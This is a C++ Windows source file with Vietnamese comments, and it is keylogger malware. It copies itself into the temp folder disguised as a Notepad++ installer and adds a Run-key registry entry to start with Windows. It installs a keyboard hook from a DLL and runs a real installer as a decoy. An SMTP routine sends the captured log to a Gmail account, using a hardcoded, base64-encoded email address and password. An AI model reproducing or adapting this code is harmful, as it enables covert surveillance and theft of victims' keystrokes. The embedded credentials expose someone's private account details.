#include "stdafx.h"
#pragma comment(lib,"ws2_32.lib")
#include <WinSock2.h>
#include <Windows.h>
#include <thread>
#include "../DLL/DLL.h"
#include <string>

//#include "easendmailobj.tlh"

//using namespace EASendMailObjLib;

using namespace std;

static time_t lastTime;
TCHAR* error;
fstream file;
char tmp_path[255];

char* ERROR_UNABLE_MOVE = "ERROR_UNABLE_MOVE";

//tìm chỉ số cuối cùng của 1 ký tự trong chuỗi
int FindLastIndexOfCharacter(char* s, char c) {
	int index = 0;
	int i = 0;
	while (*(s + i++) != '\0') {
		if (*(s + i) == c)
			index = i;
	}
	index++;
	return index;
}


char *MoveFile() {

	//xu ly path nguon
	TCHAR AppPath[256];
	GetModuleFileName(NULL, AppPath, sizeof(AppPath));

	char tmp_char[256];//need to copy exe

	lstrcpy(tmp_char, AppPath);

	int i = FindLastIndexOfCharacter(tmp_char, '\\');
	*(tmp_char + i) = '\0';//tach chuoi custardapple.exe ra khoi tmp_char

	char tmp_char2[256];
	lstrcpy(tmp_char2, tmp_char);//need to copy DLL

	char tmp_char3[256];
	lstrcpy(tmp_char3, tmp_char);//need to copy sendmail exe
	
	TCHAR exeSourceFileName[14] = "npp_7.2.2.exe";
	TCHAR dllSourceFileName[8] = "DLL.dll";
	TCHAR sendMailSourceFilenmame[10] = "file2.exe";

	strcat(tmp_char, exeSourceFileName);//ghep chuoi
	strcat(tmp_char2, dllSourceFileName);
	strcat(tmp_char3, sendMailSourceFilenmame);

	//xu ly path dich
	static char tmpPath[255];
	GetTempPath(255, tmpPath);

	//save tmpPath
	lstrcpy(tmp_path, tmpPath);

	char tmpPath2[255];
	char tmpPath3[255];
	strcpy(tmpPath2, tmpPath);
	strcpy(tmpPath3, tmpPath);

	strcat(tmpPath, exeSourceFileName);
	strcat(tmpPath2, dllSourceFileName);
	strcat(tmpPath3, sendMailSourceFilenmame);

	//copy
	if (CopyFile(tmp_char, tmpPath, FALSE) && CopyFile(tmp_char2, tmpPath2, FALSE) && CopyFile(tmp_char3, tmpPath3, FALSE)) {
		return tmpPath;
	}
	if (GetLastError() == 80)//file already exits
		return tmpPath;

	return ERROR_UNABLE_MOVE;
}


BOOL SetHookThread() {
	//cài đặt hook, exit nếu thất bại
	if (!InstallHook())
	{
		MessageBox(0, "Error Install", "Error", 0);
		return FALSE;
	}

	MSG msg;
	BOOL bRet;


	//vòng lặp đón và xử lý các message
	while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return TRUE;
}

BOOL Statup(char* tmp_char)
{
	HKEY hkey;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey) != ERROR_SUCCESS) {
		return FALSE;
	}
	RegSetValueEx(hkey, "RegTips", NULL, REG_SZ, (unsigned char*)tmp_char, strlen(tmp_char) + 1);
	RegCloseKey(hkey);
	return TRUE;
}

void getResponse(SOCKET sk) {
	char recvline[256] = { '\0' };
	int n;
	n = recv(sk, recvline, sizeof(recvline), 0);
	file.open("C:/Users/DungVan/Desktop/test.txt", ios::out | ios::app);
	file << recvline;
	file.flush();
	file.close();
}
void clodeSocket(SOCKET sk) {
	closesocket(sk);
	WSACleanup();
}
/*
 * working error
 */
BOOL Send_Mail_SMTP(char *keylogPath) {
	//Winsock Startup
	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 1);
	if (WSAStartup(DllVersion, &wsaData) != 0)
	{
		return FALSE;
	}
	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr("74.125.200.108");
	addr.sin_port = htons(587);
	addr.sin_family = AF_INET;

	SOCKET sk = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket
	if (sk == INVALID_SOCKET)
	{
		WSACleanup();
		return FALSE;
	}
	if (connect(sk, (SOCKADDR*)&addr, sizeofaddr) != 0)
	{
		return FALSE;
	}
	char EHLO[13] = "EHLO Client\n";
	char STARTTLS[16] = "STARTTLS false\n";
	char AUTH[12] = "AUTH LOGIN\n";
	char USER[30] = "ZHVuZ3ZhbjI1MTJAZ21haWwuY29t\n";
	char PASS[18] = "dGhhbnZ1MTIzNA==\n";
	char MAILFROM[36] = "MAIL FROM: <dungvan2512@gmail.com>\n";
	char RCPTTO[34] = "RCPT TO: <dungvan2512@gmail.com>\n";
	char DATA[6] = "DATA\n";
	char SUBJECT[255];
	gethostname(SUBJECT, sizeof(SUBJECT));
	lstrcat(SUBJECT, "\n");
	char CONTENTTYPE[111] = "Content-Type: text/plain; name=\"data.txt\"\nContent - Disposition : attachment; filename = \"data.txt\"\n";
	char CONTENTDATA[25600] = { '\0' };
	char QUIT[6] = "QUIT\n";
	file.open(keylogPath, ios::in);
	if (file.is_open()) {
		int i = 0;
		while (i < 50) {
			char tmp[512];
			if (file.eof())
				break;
			file.getline(tmp, sizeof(tmp), '\n');
			lstrcat(CONTENTDATA, tmp);
			lstrcat(CONTENTDATA, "\n");
			i++;
		}
		file.flush();
		file.close();
	}
	if (send(sk, EHLO, sizeof(EHLO), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, STARTTLS, sizeof(STARTTLS), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, AUTH, sizeof(AUTH), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, USER, sizeof(USER), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, PASS, sizeof(PASS), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, MAILFROM, sizeof(MAILFROM), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, RCPTTO, sizeof(RCPTTO), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, DATA, sizeof(DATA), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, SUBJECT, sizeof(SUBJECT), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, CONTENTDATA, sizeof(CONTENTDATA), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (send(sk, ".", sizeof(char), MSG_OOB) <= 0)
		clodeSocket(sk);
	if (!send(sk, QUIT, sizeof(QUIT), MSG_OOB))
		clodeSocket(sk);
	clodeSocket(sk);
	return TRUE;
}




void Mail_Thread(char *keylogPath) {

	static char pthMail[255];
	static char pthInstallNpp[255];


	//install notepad++
	char iNpp[255];
	lstrcpy(iNpp, tmp_path);
	lstrcat(iNpp, "npp.7.2.2.Installer.exe");
	lstrcpy(pthInstallNpp, iNpp);

	//run send mail after 10 minute
	char sMail[255];
	lstrcpy(sMail, tmp_path);
	lstrcat(sMail, "file2.exe");
	lstrcpy(pthMail, sMail);

	system(pthMail);//call java send mail
	
	system(pthInstallNpp);//run install npp

	//Sleep(10000);
	//int seconds = 0;
	//while (true) {
	//	time_t now;
	//	time(&now);
	//	seconds = difftime(now, lastTime);
	//	if (seconds >= 60) {
	//		seconds = 0;
	//		lastTime = now;
	//		if (Send_Mail_SMTP(keylogPath)) {
	//			std::ofstream ofs;
	//			ofs.open(keylogPath, std::ofstream::out | std::ofstream::trunc);
	//			ofs.close();
	//		}
	//	}
	//	Sleep(10000);
	//}
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow)
{
	char tmpPath[255];
	lstrcpy(tmpPath, MoveFile());
	if (strcmp(tmpPath, ERROR_UNABLE_MOVE)) {
		Statup(tmpPath);
	}
	else {
		char AppPath[255];
		GetModuleFileName(NULL, AppPath, sizeof(AppPath));
		lstrcpy(tmpPath, AppPath);
		Statup(tmpPath);
	}
	char s[255];
	static char pth[255];
	static char pthMail[255];
	GetTempPath(255, pth);
	lstrcpy(s, "data.txt");
	lstrcat(pth, s);

	time(&lastTime);

	std::thread t(Mail_Thread, pth);

	//cài đặt hook, exit nếu thất bại
	if (!InstallHook())
	{
		MessageBox(0, "Error Install", "Error", 0);
		return FALSE;
	}

	MSG msg;
	BOOL bRet;


	//vòng lặp đón và xử lý các message
	while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	//return 0;
}